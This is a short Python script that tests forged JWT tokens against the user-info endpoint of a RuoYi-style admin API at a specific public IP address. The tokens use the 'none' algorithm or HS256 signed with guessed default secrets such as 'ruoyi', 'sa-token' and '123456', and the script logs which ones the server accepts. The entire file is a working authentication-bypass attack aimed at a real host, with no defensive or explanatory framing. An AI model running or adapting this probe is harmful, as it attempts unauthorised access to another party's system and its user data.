import subprocess,time,json
names=["none-p1","hs256[ruoyi]-p1","hs256[RuoYi]-p1","hs256[jydsj]-p1","hs256[jydsj-vue-plus]-p1","hs256[jydsj@2024]-p1","hs256[123456]-p1","hs256[sa-token]-p1","hs256[sa-token-secret]-p1","hs256[dptech]-p1","hs256[abcdefghijklmnopqrstuvwxyz]-p1","none-p2","hs256[abcdefghijklmnopqrstuvwxyz]-p2","hs256[jydsj]-p2","uuid"]
toks=dict(l.rstrip("\n").split("\t",1) for l in open("tokens.tsv"))
log=open("probe.log","w")
res={}
for n in names:
    t=toks[n]
    p=subprocess.run(["curl","-s","-m","15","-o","-","-w","\n@@HTTP:%{http_code} T:%{time_total}","-H","Authorization: Bearer "+t,"http://144.123.22.234:9080/prod-api/system/user/getInfo"],capture_output=True,text=True)
    body=p.stdout.strip()
    res[n]=body
    line=f"[{n}] {body[:500]}"
    print(line); log.write(line+"\n"); log.flush()
    time.sleep(1.2)
print("\n=== distinct msgs ===")
import re
for n,b in res.items(): print(n, "->", b[:200])
log.close()
